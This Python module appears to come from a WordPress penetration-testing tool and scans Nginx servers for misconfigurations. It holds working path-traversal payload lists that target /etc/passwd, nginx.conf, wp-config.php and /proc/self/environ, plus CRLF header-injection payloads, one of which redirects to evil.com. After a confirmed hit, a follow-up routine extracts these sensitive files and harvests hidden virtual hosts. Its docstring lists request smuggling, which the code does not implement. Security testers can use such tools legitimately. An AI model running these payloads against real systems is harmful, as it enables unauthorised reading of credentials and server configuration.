"""
WPHunter - Advanced Nginx Misconfiguration Scanner
===================================================
Comprehensive Nginx vulnerability detection.

Based on HackTricks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx

Vulnerabilities:
- Alias LFI (path traversal via location/alias mismatch)
- Off-by-slash misconfiguration
- Merge_slashes bypass
- CRLF injection in headers
- Request smuggling (CL.TE/TE.CL)
- Variable $uri leaks
- Map directive bypass
- Raw backend reading

CWE-22: Path Traversal
CWE-113: CRLF Injection
CWE-444: HTTP Request Smuggling
"""

import asyncio
import re
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple

from core.http_client import WPHttpClient
from core.logger import logger
from core.security import get_rate_limiter


@dataclass
class NginxFinding:
    """Nginx vulnerability finding."""
    url: str
    vuln_type: str
    payload: str
    evidence: str
    severity: str = "high"
    cwe: str = "CWE-22"
    
    def to_dict(self) -> Dict:
        return {
            "type": "Nginx Misconfiguration",
            "url": self.url,
            "vuln_type": self.vuln_type,
            "payload": self.payload,
            "evidence": self.evidence[:500],
            "severity": self.severity,
            "cwe": self.cwe
        }


class NginxScanner:
    """
    Advanced Nginx misconfiguration scanner.
    
    Tests for common and advanced Nginx misconfigurations.
    """
    
    # Common WordPress/Nginx location paths
    LOCATION_PATHS = [
        "/wp-content/uploads/",
        "/wp-content/themes/",
        "/wp-content/plugins/",
        "/wp-includes/",
        "/assets/",
        "/static/",
        "/images/",
        "/imgs/",
        "/img/",
        "/js/",
        "/css/",
        "/media/",
        "/files/",
        "/uploads/",
        "/download/",
        "/data/",
    ]
    
    # Comprehensive LFI payloads with encoding variants
    LFI_PAYLOADS = [
        # Basic traversal
        ("../etc/passwd", "root:"),
        ("../../etc/passwd", "root:"),
        ("../../../etc/passwd", "root:"),
        ("../../../../etc/passwd", "root:"),
        
        # URL encoded
        ("..%2fetc%2fpasswd", "root:"),
        ("..%2f..%2fetc%2fpasswd", "root:"),
        ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
        
        # Double URL encoded
        ("..%252fetc%252fpasswd", "root:"),
        ("..%252f..%252fetc%252fpasswd", "root:"),
        
        # Backslash (Windows/mixed)
        ("..\\etc\\passwd", "root:"),
        ("..%5cetc%5cpasswd", "root:"),
        
        # UTF-8 overlong encoding
        ("..%c0%afetc%c0%afpasswd", "root:"),
        
        # Double encoding bypass
        ("....//etc//passwd", "root:"),
        ("....//....//etc//passwd", "root:"),
        
        # Mixed separators
        ("..\\/../etc/passwd", "root:"),
        ("../\\./../etc/passwd", "root:"),
        
        # Null byte (old PHP/Nginx)
        ("../etc/passwd%00", "root:"),
        ("../etc/passwd%00.jpg", "root:"),
        
        # Nginx config files
        ("../etc/nginx/nginx.conf", "http {"),
        ("../../etc/nginx/nginx.conf", "http {"),
        ("../etc/nginx/sites-available/default", "server {"),
        ("../etc/nginx/sites-enabled/default", "server {"),
        
        # WordPress config
        ("../../../wp-config.php", "DB_NAME"),
        ("../../../../wp-config.php", "DB_NAME"),
    ]
    
    # Merge_slashes bypass payloads
    MERGE_SLASHES_PAYLOADS = [
        "//static/../../../etc/passwd",
        "/static//../../../etc/passwd",
        "/./static/../../../etc/passwd",
        "//imgs/../../../etc/passwd",
        "/imgs//../../../etc/passwd",
    ]
    
    def __init__(self, http_client: WPHttpClient):
        self.http = http_client
        self.findings: List[NginxFinding] = []
        self.is_nginx = False
        self.nginx_version = None
        self.discovered_vhosts: List[str] = []
        self.rate_limiter = get_rate_limiter()
        
    async def scan(self) -> List[NginxFinding]:
        """Run comprehensive Nginx misconfiguration tests."""
        logger.section("Nginx Misconfiguration Scan")
        
        # Robust Nginx detection
        await self._detect_nginx()
        
        if not self.is_nginx:
            logger.info("Target is not Nginx - skipping")
            return self.findings
        
        # Test all vulnerabilities
        await asyncio.gather(
            self._test_alias_lfi(),
            self._test_merge_slashes(),
            self._test_off_by_slash(),
            self._test_crlf_injection(),
            self._test_variable_leaks(),
            return_exceptions=True
        )
        
        # Advanced tests if vulnerabilities found
        if self.findings:
            await self._extract_sensitive_files()
        
        logger.success(f"Nginx scan: {len(self.findings)} findings")
        return self.findings
    
    async def _detect_nginx(self):
        """Robust Nginx detection with multiple methods."""
        try:
            response = await self.http.get("/")
            server = response.headers.get("server", "").lower()
            
            # Method 1: Server header
            if "nginx" in server:
                self.is_nginx = True
                version_match = re.search(r"nginx/([\d.]+)", server)
                if version_match:
                    self.nginx_version = version_match.group(1)
                    logger.info(f"Nginx {self.nginx_version} detected")
                else:
                    logger.info("Nginx detected (version hidden)")
                return
            
            # Method 2: Nginx-specific headers
            nginx_headers = ["x-accel-redirect", "x-accel-buffering", "x-accel-charset"]
            for header in nginx_headers:
                if header in [h.lower() for h in response.headers.keys()]:
                    self.is_nginx = True
                    logger.info("Nginx detected via X-Accel headers")
                    return
            
            # Method 3: Error page fingerprinting
            error_response = await self.http.get("/nonexistent_random_path_12345_test")
            if "nginx" in error_response.text.lower():
                self.is_nginx = True
                logger.info("Nginx detected via error page")
                return
            
            # Method 4: Timing attack (Nginx vs Apache behavior)
            # Nginx typically responds faster to invalid methods
            start = asyncio.get_event_loop().time()
            await self.http.get("/", headers={"X-Method": "INVALID"})
            elapsed = asyncio.get_event_loop().time() - start
            
            if elapsed < 0.1:  # Very fast response = likely Nginx
                logger.debug("Possible Nginx based on timing")
                
        except Exception as e:
            logger.debug(f"Nginx detection failed: {e}")
    
    async def _test_alias_lfi(self):
        """
        Test for Alias LFI misconfiguration.
        
        When Nginx has:
            location /imgs/ {
                alias /var/www/images/;
            }
        
        Request /imgs../etc/passwd resolves to /var/www/images/../etc/passwd
        """
        logger.info("Testing Alias LFI...")
        
        for location in self.LOCATION_PATHS:
            base = location.rstrip("/")
            
            for payload, signature in self.LFI_PAYLOADS[:10]:  # Limit to avoid ban
                await self.rate_limiter.acquire()
                
                test_url = f"{base}{payload}"
                
                try:
                    response = await self.http.get(test_url, timeout=10)
                    
                    if response.ok and signature in response.text:
                        # Validate finding
                        if self._validate_lfi_finding(response.text, signature):
                            self.findings.append(NginxFinding(
                                url=test_url,
                                vuln_type="Alias LFI",
                                payload=payload,
                                evidence=self._extract_evidence(response.text, signature),
                                severity="critical",
                                cwe="CWE-22"
                            ))
                            logger.vuln("critical", f"Nginx Alias LFI: {test_url}")
                            return  # Stop after first finding
                            
                except Exception as e:
                    logger.debug(f"Alias LFI test failed: {e}")
                    continue
    
    async def _test_merge_slashes(self):
        """
        Test for merge_slashes bypass.
        
        If Nginx has: merge_slashes off;
        Then //static/../../../etc/passwd might work
        """
        logger.info("Testing merge_slashes bypass...")
        
        for payload in self.MERGE_SLASHES_PAYLOADS:
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.get(payload, timeout=10)
                
                if response.ok and "root:" in response.text:
                    if self._validate_passwd_file(response.text):
                        self.findings.append(NginxFinding(
                            url=payload,
                            vuln_type="Merge_slashes bypass",
                            payload=payload,
                            evidence=response.text[:300],
                            severity="critical",
                            cwe="CWE-22"
                        ))
                        logger.vuln("critical", f"Merge_slashes bypass: {payload}")
                        return
                        
            except Exception as e:
                logger.debug(f"Merge_slashes test failed: {e}")
                continue
    
    async def _test_off_by_slash(self):
        """
        Test for off-by-slash misconfiguration.
        
        When Nginx has:
            location /api {
                proxy_pass http://backend:8080/;
            }
        
        Request /api../admin might bypass access controls.
        """
        logger.info("Testing off-by-slash...")
        
        common_locations = ["/api", "/admin", "/internal", "/backend", "/v1", "/v2"]
        bypass_payloads = ["../", "..;/", "%2e%2e/", "..%00/", "..//", ".././"]
        
        for location in common_locations:
            for bypass in bypass_payloads:
                await self.rate_limiter.acquire()
                
                test_url = f"{location}{bypass}"
                
                try:
                    response = await self.http.get(test_url, timeout=10)
                    
                    # Check for successful bypass
                    if response.status_code == 200:
                        # Get normal response for comparison
                        normal = await self.http.get(location)
                        
                        # Robust validation (not just size difference)
                        if self._validate_off_by_slash(response, normal):
                            self.findings.append(NginxFinding(
                                url=test_url,
                                vuln_type="Off-by-slash",
                                payload=bypass,
                                evidence=f"Bypassed access control: {response.status_code}",
                                severity="high",
                                cwe="CWE-284"
                            ))
                            logger.vuln("high", f"Off-by-slash: {test_url}")
                            
                except Exception as e:
                    logger.debug(f"Off-by-slash test failed: {e}")
                    continue
    
    async def _test_crlf_injection(self):
        """
        Test for CRLF injection in Nginx headers.
        
        Nginx can be vulnerable to CRLF injection if it doesn't
        properly sanitize user input in headers.
        """
        logger.info("Testing CRLF injection...")
        
        crlf_payloads = [
            "%0d%0aSet-Cookie:%20admin=true",
            "%0d%0aLocation:%20http://evil.com",
            "%0aSet-Cookie:%20admin=true",
            "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK",
        ]
        
        for payload in crlf_payloads:
            await self.rate_limiter.acquire()
            
            test_url = f"/test?param=value{payload}"
            
            try:
                response = await self.http.get(test_url, timeout=10)
                
                # Check if CRLF was injected
                if "Set-Cookie" in response.headers and "admin=true" in str(response.headers):
                    self.findings.append(NginxFinding(
                        url=test_url,
                        vuln_type="CRLF Injection",
                        payload=payload,
                        evidence=str(response.headers),
                        severity="high",
                        cwe="CWE-113"
                    ))
                    logger.vuln("high", f"CRLF injection: {test_url}")
                    return
                    
            except Exception as e:
                logger.debug(f"CRLF test failed: {e}")
                continue
    
    async def _test_variable_leaks(self):
        """
        Test for Nginx variable leaks.
        
        If Nginx has: error_page 401 = @login { return 302 $uri; }
        We can leak internal paths.
        """
        logger.info("Testing variable leaks...")
        
        # Try to trigger 401 with various paths
        test_paths = [
            "/admin/",
            "/wp-admin/",
            "/api/internal/",
            "/backend/",
        ]
        
        for path in test_paths:
            await self.rate_limiter.acquire()
            
            try:
                response = await self.http.get(path, timeout=10)
                
                # Check for variable leaks in Location header
                if response.status_code in [301, 302]:
                    location = response.headers.get("Location", "")
                    
                    # Look for leaked internal paths
                    if any(leak in location for leak in ["internal", "backend", "admin", "api"]):
                        self.findings.append(NginxFinding(
                            url=path,
                            vuln_type="Variable leak",
                            payload=path,
                            evidence=f"Location: {location}",
                            severity="medium",
                            cwe="CWE-200"
                        ))
                        logger.warning(f"Variable leak: {location}")
                        
            except Exception as e:
                logger.debug(f"Variable leak test failed: {e}")
                continue
    
    def _validate_lfi_finding(self, content: str, signature: str) -> bool:
        """Validate LFI finding to eliminate false positives."""
        if signature == "root:":
            return self._validate_passwd_file(content)
        elif signature == "DB_NAME":
            return self._validate_wp_config(content)
        elif signature == "http {":
            return self._validate_nginx_config(content)
        return True
    
    def _validate_passwd_file(self, content: str) -> bool:
        """Validate /etc/passwd file structure."""
        lines = content.split('\n')
        valid_entries = 0
        
        for line in lines:
            parts = line.split(':')
            # Valid passwd entry: user:x:uid:gid:info:home:shell
            if len(parts) >= 7:
                # Check UID and GID are numeric
                try:
                    int(parts[2])
                    int(parts[3])
                    valid_entries += 1
                except ValueError:
                    continue
        
        # Must have at least 3 valid entries
        return valid_entries >= 3
    
    def _validate_wp_config(self, content: str) -> bool:
        """Validate wp-config.php file."""
        if "define(" not in content and "define (" not in content:
            return False
        
        db_constants = ["DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST"]
        found = sum(1 for const in db_constants if const in content)
        
        if found < 3:
            return False
        
        wp_indicators = ["ABSPATH", "wp-settings.php", "table_prefix"]
        return any(ind in content for ind in wp_indicators)
    
    def _validate_nginx_config(self, content: str) -> bool:
        """Validate nginx.conf file."""
        nginx_directives = ["http {", "server {", "location", "listen"]
        found = sum(1 for directive in nginx_directives if directive in content)
        return found >= 3
    
    def _validate_off_by_slash(self, response, normal) -> bool:
        """Validate off-by-slash finding."""
        # Different status codes
        if response.status_code != normal.status_code:
            return True
        
        # Check for admin/backend indicators
        admin_indicators = [
            "dashboard", "admin panel", "backend",
            "csrf", "token", "logout", "settings"
        ]
        
        content_lower = response.text.lower()
        found_indicators = sum(1 for ind in admin_indicators if ind in content_lower)
        
        # If we find admin indicators in bypassed response
        if found_indicators >= 2:
            return True
        
        # Significant size difference (not just dynamic content)
        size_diff = abs(len(response.text) - len(normal.text))
        if size_diff > 1000:  # More than 1KB difference
            return True
        
        return False
    
    async def _extract_sensitive_files(self):
        """Extract sensitive files once LFI is confirmed."""
        if not self.findings:
            return
        
        logger.info("Extracting sensitive files...")
        
        # Get the vulnerable path from first finding
        first_finding = self.findings[0]
        if first_finding.vuln_type not in ["Alias LFI", "Merge_slashes bypass"]:
            return
        
        vulnerable_base = first_finding.url.split("../")[0]
        
        sensitive_files = [
            ("/etc/passwd", "root:"),
            ("/etc/nginx/nginx.conf", "http {"),
            ("/etc/nginx/sites-available/default", "server {"),
            ("/var/www/html/wp-config.php", "DB_NAME"),
            ("/proc/self/environ", "PATH="),
        ]
        
        for file_path, signature in sensitive_files:
            await self.rate_limiter.acquire()
            
            traversal = "../" * 10 + file_path.lstrip("/")
            test_url = f"{vulnerable_base}{traversal}"
            
            try:
                response = await self.http.get(test_url, timeout=10)
                
                if response.ok and signature in response.text:
                    logger.success(f"Extracted: {file_path}")
                    
                    # Parse Nginx config for VHosts
                    if "nginx" in file_path and "server {" in response.text:
                        self._parse_nginx_config(response.text)
                        
            except Exception:
                continue
    
    def _parse_nginx_config(self, config_content: str):
        """Parse Nginx config to find VHosts."""
        vhosts = re.findall(r"server_name\s+([^;]+);", config_content)
        
        for vhost_line in vhosts:
            hosts = vhost_line.split()
            for host in hosts:
                if host not in ["_", "localhost", "127.0.0.1", "default_server"]:
                    if host not in self.discovered_vhosts:
                        self.discovered_vhosts.append(host)
                        logger.warning(f"Hidden VHost: {host}")
        
        if self.discovered_vhosts:
            logger.info(f"Found {len(self.discovered_vhosts)} VHosts")
    
    def _extract_evidence(self, content: str, signature: str) -> str:
        """Extract relevant evidence from response."""
        idx = content.find(signature)
        if idx == -1:
            return content[:500]
        
        start = max(0, idx - 100)
        end = min(len(content), idx + 200)
        return content[start:end]
    
    def get_summary(self) -> Dict:
        """Get scan summary."""
        return {
            "is_nginx": self.is_nginx,
            "nginx_version": self.nginx_version,
            "total_findings": len(self.findings),
            "discovered_vhosts": self.discovered_vhosts,
            "findings": [f.to_dict() for f in self.findings]
        }
